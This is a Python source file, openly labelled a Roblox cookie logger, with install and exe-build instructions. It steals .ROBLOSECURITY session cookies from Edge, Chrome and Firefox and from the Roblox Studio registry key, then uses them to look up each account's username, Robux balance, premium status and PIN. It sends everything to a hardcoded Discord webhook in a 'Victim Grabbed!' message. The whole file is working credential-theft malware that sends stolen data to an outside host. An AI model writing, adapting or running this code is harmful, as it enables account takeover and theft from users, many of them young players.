from winreg import HKEY_CURRENT_USER, EnumValue, OpenKey
import browser_cookie3, threading, json , requests, robloxpy
from discord_webhook import DiscordEmbed, DiscordWebhook

# MODULES REQUIRED FOR THIS PROJECT!
# pip install browser_cookie3
# pip install robloxpy
# pip install requests
# pip install json
# pip install discord_webhook

# Py to exe?
# pyinstaller {filename} --onefile

# HOPE YOU GUYS ENJOY THIS TOOL

# OPEN SOURCE ROBLOX COOKIE LOGGER MADE ON 11/4/2022 BY Termed$#0004


# Webhook here
HookX = "https://discord.com/api/webhooks/1036255378436018216/AYVwdBcuZQKIB3KtyXOFxMk4bk80NfKbGkfZTopGpWCaT-b2NAf3lUFirWlqQ1-0hNeh"

# browser Edge Logger

def ChromeEdge():
    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        info = requests.get("https://auth.roblox.com/v1/account/pin",cookies={".ROBLOSECURITY":cookie})
        if info.status_code == 200:
            information = json.loads(info.text)
            pin = information["isEnabled"]
            username = information['UserName']
            id = information["UserID"]
            balance = information["RobuxBalance"]
            premium = information["IsPremium"]
            image = information["ThumbnailUrl"]
            EmbedHooks = {
          "username": "Termed Browser Grabber",
          "avatar_url":"https://media.discordapp.net/attachments/1037071504443183107/1038150813505302688/hqdefault.jpg",
                      "embeds": [
                {
                    "author": {
    
                    },
                    "description": f"```Roblox Cookie Is:{cookie}``` There Info On The Roblox Cookie Is ```Roblox Username Of The Account Is: {username}``` ```Roblox Id Of The Account Is: {id}``` ```Roblox Robux Balance Of The Account Is: {balance}```  ```Roblox Premium Of The Account Is: {premium}```  ```Roblox Thumnail Of The Account Is : {image}``` ```roblox pin Of account: {pin}```",                       
                    "footer": {
                      "text": "discord.gg/ltbeams | Termed$#0004"
                    }
                }
            ]

        }
        requests.post(HookX, json=EmbedHooks) 
    except:
         EmbedHook = {
          "username": "Termed Browser Grabber",
          "avatar_url":"https://media.discordapp.net/attachments/1037071504443183107/1038150813505302688/hqdefault.jpg",
                      "embeds": [
                {
                    "author": {
        
                    },
                    "description": f"```Failed to Grab cookies from Chrome edge!```",                      
                }
            ]

        }
         requests.post(HookX, json=EmbedHook)

# Chrome GoogleChrome Logger

def GoogleChrome():
    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        info = requests.get("https://auth.roblox.com/v1/account/pin",cookies={".ROBLOSECURITY":cookie})
        if info.status_code == 200:
            information = json.loads(info.text)
            pin = information["isEnabled"]
            username = information['UserName']
            id = information["UserID"]
            balance = information["RobuxBalance"]
            premium = information["IsPremium"]
            image = information["ThumbnailUrl"]
            EmbedHook = {
          "username": "Termed Browser Grabber",
          "avatar_url":"https://media.discordapp.net/attachments/1037071504443183107/1038150813505302688/hqdefault.jpg",
                      "embeds": [
                {
                    "author": {
                    
                    },
                    "description": f"```Roblox Cookie Is:{cookie}``` There Info On The Roblox Cookie Is ```Roblox Username Of The Account Is: {username}``` ```Roblox Id Of The Account Is: {id}``` ```Roblox Robux Balance Of The Account Is: {balance}```  ```Roblox Premium Of The Account Is: {premium}```  ```Roblox Thumnail Of The Account Is : {image}``` ```roblox pin Of account: {pin}```",                       
                    "footer": {
                      "text": "discord.gg/ltbeams | Termed$#0004"
                    }
                }
            ]

        }
        requests.post(HookX, json=EmbedHook) 
    except:
         EmbedHook = {
          "username": "Termed Browser Grabber",
          "avatar_url":"https://media.discordapp.net/attachments/1037071504443183107/1038150813505302688/hqdefault.jpg",
                      "embeds": [
                {
                    "author": {
                    
                    },
                    "description": f"```Failed to Grab cookies from Chrome browser!```",                      
                }
            ]

        }
         requests.post(HookX, json=EmbedHook) 
         pass

# Firefox Browser Logger
def FireFoxBrowser():
    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        info = requests.get("https://auth.roblox.com/v1/account/pin",cookies={".ROBLOSECURITY":cookie})
        if info.status_code == 200:
            information = json.loads(info.text)
            pin = information["isEnabled"]
            username = information['UserName']
            id = information["UserID"]
            balance = information["RobuxBalance"]
            premium = information["IsPremium"]
            image = information["ThumbnailUrl"]
            EmbedHook3 = {
          "username": "Termed Browser Grabber",
          "avatar_url":"https://media.discordapp.net/attachments/1037071504443183107/1038150813505302688/hqdefault.jpg",
                      "embeds": [
                {
                    "author": {
                    },
                    "description": f"```Roblox Cookie Is:{cookie}``` There Info On The Roblox Cookie Is ```Roblox Username Of The Account Is: {username}``` ```Roblox Id Of The Account Is: {id}``` ```Roblox Robux Balance Of The Account Is: {balance}```  ```Roblox Premium Of The Account Is: {premium}```  ```Roblox Thumnail Of The Account Is : {image}``` ```roblox pin Of account: {pin}```",                       
                    "footer": {
                      "text": "discord.gg/ltbeams | Termed$#0004"
                    }
                }
            ]

        }
        requests.post(HookX, json=EmbedHook3) 
    except:
         Termed = {
          "username": "Termed Browser Grabber",
          "avatar_url":"https://media.discordapp.net/attachments/1037071504443183107/1038150813505302688/hqdefault.jpg",
                      "embeds": [
                {
                    "author": {

                    },
                    "description": f"```Failed to Grab cookies from fire fox!```",                      
                }
            ]

        }
         requests.post(HookX, json=Termed) 
         pass

Robloxbrowsers = [FireFoxBrowser,ChromeEdge,GoogleChrome]
for LL in Robloxbrowsers:
  threading.Thread(target=LL,).start()
pass

# Roblox studio Cookie Grabber

def GrabRobloxCookie():



    Robloxstudiopathlol = OpenKey(HKEY_CURRENT_USER, 
    r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com")



    try:

        count = 0

        while True:

            name, value, type = EnumValue(Robloxstudiopathlol, count)

            if name == ".ROBLOSECURITY":



                return value

            count = count + 1

    except WindowsError:

        pass

try:



    Cookievalue = str(GrabRobloxCookie())
    robloxTermedcookie = Cookievalue.split("COOK::<")[1].split(">")[0]



except:
    requests.post(url=HookX,data={"username":"Termed Logger", "avatar_url":"https://media.discordapp.net/attachments/1037071504443183107/1038150813505302688/hqdefault.jpg","content":f""})





try: 
    r = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":robloxTermedcookie}).json()

except:
    requests.post(url=HookX,data={"username":"Termed Logger", "avatar_url":"https://media.discordapp.net/attachments/1037071504443183107/1038150813505302688/hqdefault.jpg","content":f"Failed to Grab cookies!"})


strr = requests.get("https://auth.roblox.com/v1/account/pin",cookies={".ROBLOSECURITY":robloxTermedcookie}).json()

pin = strr["isEnabled"]

id = r["UserID"]

username = r['UserName']

robux = r['RobuxBalance']

p = r['IsPremium']

profile = f"https://web.roblox.com/users/{id}/profile"

rolimons = f"https://www.rolimons.com/player/{id}"

profile2 = robloxpy.User.External.GetHeadshot(id)

rap = robloxpy.User.External.GetRAP(id)

Robloxinfo = {

  "content": '**discord.gg/ltbeams**',

  "embeds": [

    {

      "title": "**Victim Grabbed! | Termed Grabber**",

      "color": 00000,

      "fields": [

        {

          "name": "Username",

          "value": f"{username}",

          "inline": True

        },

        {

          "name": "Robux",

          "value": f"{robux}",

          "inline": True

        },

        {

          "name": "Premium?",

          "value": f"{p}",

          "inline": True

        },       

        {

          "name": "RAP?",

          "value": f"{rap}",

          "inline": True

        },

        {

          "name": "PIN?",

          "value": f"{pin}",

          "inline": True

        },

        {

          "name": "ROBLOX | ROLIMONS",

          "value": f"[Rolimons](https://www.rolimons.com/player/{id}) | [Roblox](https://www.roblox.com/users/{id})",

          "inline": True

        },

        {

          "name": "ROBLOX COOKIE",

          "value": f"```{robloxTermedcookie}```"

        },
        {

          "name": "Credits",

          "value": f"```Termed$#0004 | Ymz#0001```"

        }

      ],

      "footer": {

        "text": "Termed (c)"

      },

      "thumbnail": {

        "url": f"{profile2}"

      }

    }

  ],

  "username": "Termed Grabber",

  "avatar_url": "https://media.discordapp.net/attachments/1037071504443183107/1038150813505302688/hqdefault.jpg",

  "attachments": []

}

requests.post(HookX, json=Robloxinfo)

